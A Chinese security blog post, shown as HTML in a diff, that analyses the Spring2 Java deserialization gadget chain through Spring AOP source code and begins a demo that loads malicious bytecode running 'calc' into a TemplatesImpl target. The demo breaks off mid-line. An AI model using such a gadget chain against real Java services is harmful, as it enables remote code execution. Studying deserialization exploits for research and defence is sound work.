@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Spring反序列化链2简介这个链是利用JdkDynamicAopProxy和AnnotationInvocationHandler结合的链条，和spring1几乎一样，就是把ObjectFactoryDelegatingInvocationHandler换成JdkDynamicAopProxy 12345678910&lt;dependency&gt;    &lt;groupId&gt;org">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring2反序列化链">
+<meta property="og:url" content="http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="毛利小五郎">
+<meta property="og:description" content="Spring反序列化链2简介这个链是利用JdkDynamicAopProxy和AnnotationInvocationHandler结合的链条，和spring1几乎一样，就是把ObjectFactoryDelegatingInvocationHandler换成JdkDynamicAopProxy 12345678910&lt;dependency&gt;    &lt;groupId&gt;org">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250120142402160.png">
+<meta property="article:published_time" content="2025-01-20T08:36:38.000Z">
+<meta property="article:modified_time" content="2025-01-20T08:37:44.969Z">
+<meta property="article:author" content="Mouri-Kogorou">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250120142402160.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Spring2反序列化链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Mouri-Kogorou">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/20/Spring1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&text=Spring2反序列化链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&is_video=false&description=Spring2反序列化链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring2反序列化链&body=Check out this article: http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&title=Spring2反序列化链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&name=Spring2反序列化链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/20/Spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/&t=Spring2反序列化链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE2"><span class="toc-number">1.</span> <span class="toc-text">Spring反序列化链2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdkDynamicAopProxy"><span class="toc-number">1.2.</span> <span class="toc-text">JdkDynamicAopProxy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#target%E8%B5%8B%E5%80%BC"><span class="toc-number">1.2.1.</span> <span class="toc-text">target赋值</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%A4%B1%E8%B4%A5"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">尝试失败</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%88%90%E5%8A%9F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">尝试成功</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.3.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.4.</span> <span class="toc-text">实现</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Spring2反序列化链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Mouri-Kogorou</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-20T08:36:38.000Z" class="dt-published" itemprop="datePublished">2025-01-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Spring反序列化链2"><a href="#Spring反序列化链2" class="headerlink" title="Spring反序列化链2"></a>Spring反序列化链2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个链是利用JdkDynamicAopProxy和AnnotationInvocationHandler结合的链条，和spring1几乎一样，就是把ObjectFactoryDelegatingInvocationHandler换成JdkDynamicAopProxy</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.2.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h2><p>我们看到他的invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">    Class&lt;?&gt; targetClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    Object retVal;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">var18</span> <span class="operator">=</span> <span class="built_in">this</span>.equals(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">var17</span> <span class="operator">=</span> <span class="built_in">this</span>.hashCode();</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.advised.opaque || !method.getDeclaringClass().isInterface() || !method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.advised.exposeProxy) &#123;</span><br><span class="line">                oldProxy = AopContext.setCurrentProxy(proxy);</span><br><span class="line">                setProxyContext = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            target = targetSource.getTarget();</span><br><span class="line">            <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">                targetClass = target.getClass();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List&lt;Object&gt; chain = <span class="built_in">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">            <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">                retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">MethodInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">                retVal = invocation.proceed();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (retVal != <span class="literal">null</span> &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass())) &#123;</span><br><span class="line">                retVal = proxy;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="literal">null</span> &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">var13</span> <span class="operator">=</span> retVal;</span><br><span class="line">            <span class="keyword">return</span> var13;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        retVal = AopUtils.invokeJoinpointUsingReflection(<span class="built_in">this</span>.advised, method, args);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; !targetSource.isStatic()) &#123;</span><br><span class="line">            targetSource.releaseTarget(target);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (setProxyContext) &#123;</span><br><span class="line">            AopContext.setCurrentProxy(oldProxy);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点在<code>retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);</code></p>
+<p>我们看到<code>invokeJoinpointUsingReflection</code>这个函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionUtils.makeAccessible(method);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">        <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var4;</span><br><span class="line">        <span class="keyword">throw</span> ex.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var5) &#123;</span><br><span class="line">        <span class="type">IllegalArgumentException</span> <span class="variable">ex</span> <span class="operator">=</span> var5;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;AOP configuration seems to be invalid: tried calling method [&quot;</span> + method + <span class="string">&quot;] on target [&quot;</span> + target + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="type">IllegalAccessException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Could not access method [&quot;</span> + method + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是个任意方法调用</p>
+<h3 id="target赋值"><a href="#target赋值" class="headerlink" title="target赋值"></a>target赋值</h3><h4 id="尝试失败"><a href="#尝试失败" class="headerlink" title="尝试失败"></a>尝试失败</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = targetSource.getTarget();</span><br></pre></td></tr></table></figure>
+
+<p>我们看看这个targetSource是什么</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br></pre></td></tr></table></figure>
+
+<p>我们先看到TargetSource是什么</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TargetSource</span> <span class="keyword">extends</span> <span class="title class_">TargetClassAware</span> &#123;</span><br><span class="line">    Class&lt;?&gt; getTargetClass();</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isStatic</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getTarget</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">releaseTarget</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他是个接口， 有getTarget()，那么target就是个可以任意控制target</p>
+<p>我们来看看怎么给this.advised.targetSource赋值，变成代理类，这样调用getTarget()，就可以返回任意值了</p>
+<p>这个this.advised在前面构造函数里面就赋值了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JdkDynamicAopProxy</span><span class="params">(AdvisedSupport config)</span> <span class="keyword">throws</span> AopConfigException &#123;</span><br><span class="line">    Assert.notNull(config, <span class="string">&quot;AdvisedSupport must not be null&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (config.getAdvisors().length == <span class="number">0</span> &amp;&amp; config.getTargetSource() == AdvisedSupport.EMPTY_TARGET_SOURCE) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopConfigException</span>(<span class="string">&quot;No advisors and no TargetSource specified&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.advised = config;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到advised里面的targetSource</p>
+<p><img src="https://raw.githubusercontent.com/Mouri-Kogorou/img/main/imgs/20250120142402160.png"></p>
+<p>他可以通过反射赋值，我们就把AnnotationInvocationHandler这个代理给他就行</p>
+<h4 id="尝试成功"><a href="#尝试成功" class="headerlink" title="尝试成功"></a>尝试成功</h4><p>根本不用上面那么麻烦</p>
+<p>AdvisedSupport里面有setTarget和setTargetSource</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTarget</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.setTargetSource(<span class="keyword">new</span> <span class="title class_">SingletonTargetSource</span>(target));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetSource</span><span class="params">(TargetSource targetSource)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.targetSource = targetSource != <span class="literal">null</span> ? targetSource : EMPTY_TARGET_SOURCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看看<code>SingletonTargetSource</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SingletonTargetSource</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">    Assert.notNull(target, <span class="string">&quot;Target object must not be null&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.target = target;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; getTargetClass() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.target.getClass();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getTarget</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们把我们代理的恶意类target，当他getTarget()就会返回恶意类</p>
+<p>我们构造一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">as.setTarget(templates);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;calc&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">TransformerFactory</span> <span class="variable">factory1</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, factory1);</span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedsupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedsupport.setTarget(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">jdkdynamicaopproxyclazz</span> <span class="operator">=</span> 